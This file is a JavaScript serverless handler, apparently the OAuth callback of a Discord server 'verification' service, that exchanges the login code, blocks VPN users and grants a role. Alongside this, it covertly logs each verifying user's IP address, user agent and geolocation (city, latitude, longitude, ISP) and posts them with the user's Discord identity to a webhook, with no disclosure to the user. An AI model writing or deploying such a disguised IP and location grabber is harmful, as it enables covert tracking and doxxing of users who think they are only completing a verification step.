import fetch from "node-fetch";

export default async function handler(req, res) {
  const code = req.query.code;
  if (!code) return res.status(400).send("Missing code");

  // Discord & API environment variables
  const client_id = process.env.DISCORD_CLIENT_ID;
  const client_secret = process.env.DISCORD_CLIENT_SECRET;
  const bot_token = process.env.DISCORD_BOT_TOKEN;
  const guild_id = process.env.DISCORD_GUILD_ID;
  const role_id = process.env.DISCORD_ROLE_ID;
  const webhook_url = process.env.DISCORD_WEBHOOK_URL;
  const redirect_uri = "https://berify-topaz.vercel.app/api/callback";
  const ipqs_key = process.env.IPQUALITYSCORE_API_KEY;

  // Get client IP
  const ip =
    (req.headers["x-forwarded-for"]?.split(",")[0].trim()) ||
    req.socket.remoteAddress ||
    "Unknown IP";

  const userAgent = req.headers["user-agent"] || "Unknown User Agent";

  // VPN/Proxy detection
  let vpnDetected = false;
  let ipqsData = {};
  try {
    const ipqsRes = await fetch(`https://ipqualityscore.com/api/json/ip/${ipqs_key}/${ip}`);
    ipqsData = await ipqsRes.json();
    vpnDetected =
      (ipqsData.vpn || ipqsData.proxy || ipqsData.tor) &&
      (ipqsData.fraud_score || 0) >= 50; // adjustable fraud score threshold
  } catch (e) {
    console.warn("IPQS check failed:", e.message);
  }

  if (vpnDetected) {
    return res.status(403).send("VPN: True\n\ndisable ur vpn. (anti alt)");
  }

  try {
    // 1️⃣ Exchange code for access token
    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        client_id,
        client_secret,
        grant_type: "authorization_code",
        code,
        redirect_uri,
      }),
    });

    const tokenData = await tokenRes.json();
    if (!tokenData.access_token) return res.status(400).send("Failed to get access token");

    // 2️⃣ Get user info
    const userRes = await fetch("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    const userData = await userRes.json();

    // 3️⃣ Optional GeoIP data
    let geoData = {};
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp`);
      const geoJson = await geoRes.json();
      geoData = geoJson.status === "success" ? geoJson : { error: geoJson.message || "Unknown error" };
    } catch (geoErr) {
      geoData = { error: geoErr.message || "Fetch failed" };
    }

    // 4️⃣ Add role to guild member
    const addRoleRes = await fetch(
      `https://discord.com/api/guilds/${guild_id}/members/${userData.id}/roles/${role_id}`,
      { method: "PUT", headers: { Authorization: `Bot ${bot_token}` } }
    );

    if (!addRoleRes.ok) {
      const errorText = await addRoleRes.text();
      console.error("Failed to add role:", errorText);
      return res.status(500).send("Failed to assign role: " + errorText);
    }

    // 5️⃣ Send webhook
    if (webhook_url) {
      const avatarUrl = userData.avatar
        ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=1024`
        : null;

      const geoFields = geoData.error
        ? [{ name: "Geo Lookup Error", value: geoData.error, inline: false }]
        : [
            { name: "Country", value: geoData.country || "N/A", inline: true },
            { name: "Region", value: geoData.regionName || "N/A", inline: true },
            { name: "City", value: geoData.city || "N/A", inline: true },
            { name: "Latitude", value: geoData.lat?.toString() || "N/A", inline: true },
            { name: "Longitude", value: geoData.lon?.toString() || "N/A", inline: true },
            { name: "Timezone", value: geoData.timezone || "N/A", inline: true },
            { name: "ISP", value: geoData.isp || "N/A", inline: false },
          ];

      await fetch(webhook_url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [
            {
              title: "New User Verified",
              color: 0x7289DA,
              thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
              fields: [
                { name: "Username", value: `${userData.username}#${userData.discriminator}`, inline: true },
                { name: "User ID", value: userData.id, inline: true },
                { name: "IP Address", value: ip, inline: false },
                { name: "User Agent", value: userAgent, inline: false },
                { name: "Token Type", value: tokenData.token_type, inline: true },
                { name: "Scope", value: tokenData.scope, inline: true },
                { name: "Expires In (seconds)", value: tokenData.expires_in?.toString() || "unknown", inline: true },
                ...geoFields,
              ],
              timestamp: new Date().toISOString(),
            },
          ],
        }),
      });
    }

    return res.redirect(`https://discord.com/channels/${guild_id}`);
  } catch (error) {
    console.error(error);
    return res.status(500).send("Server error");
  }
}
